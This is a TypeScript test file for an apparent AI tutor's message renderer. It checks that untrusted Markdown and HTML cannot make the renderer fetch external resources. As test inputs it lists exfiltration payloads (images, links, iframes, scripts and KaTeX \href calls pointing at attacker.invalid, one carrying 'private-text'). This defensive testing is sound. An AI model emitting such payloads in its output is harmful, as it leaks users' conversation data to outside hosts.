import assert from "node:assert/strict";
import test from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { TutorMessage } from "../src/components/tutor-message";

function render(text: string) {
  return renderToStaticMarkup(createElement(TutorMessage, null, text));
}

test("Tutor renderer never emits image/link requests from untrusted Markdown", () => {
  for (const text of [
    "![diagram][img]\n\n[img]: //attacker.invalid/pixel?conversation=private-text",
    "![diagram](https://attacker.invalid/pixel)",
    "[diagram][ref]\n\n[ref]: //attacker.invalid/private",
    "[diagram](https://attacker.invalid/private)",
    "<https://attacker.invalid/private>",
    '<img src="//attacker.invalid/pixel"><iframe src="//attacker.invalid/frame"></iframe>',
    '<script src="//attacker.invalid/script"></script>',
    "$\\href{https://attacker.invalid/private}{diagram}$",
    "$\\includegraphics{https://attacker.invalid/pixel}$",
  ]) {
    const html = render(text);
    assert.doesNotMatch(html, /<(?:img|a|link|iframe|script)\b/i, text);
    assert.doesNotMatch(html, /\s(?:src|srcset|href)=/i, text);
  }
  assert.match(
    render("![diagram][img]\n\n[img]: //attacker.invalid/pixel"),
    /diagram/,
  );
  assert.match(render("[label](https://attacker.invalid)"), /label/);
});

test("Tutor renderer preserves formatting and untrusted-safe academic math", () => {
  const html = render("**Binary**: $2^3 = 8$\n\n`NOT S`");
  assert.match(html, /<strong>Binary<\/strong>/);
  assert.match(html, /class="katex"/);
  assert.match(html, /<code>NOT S<\/code>/);
});
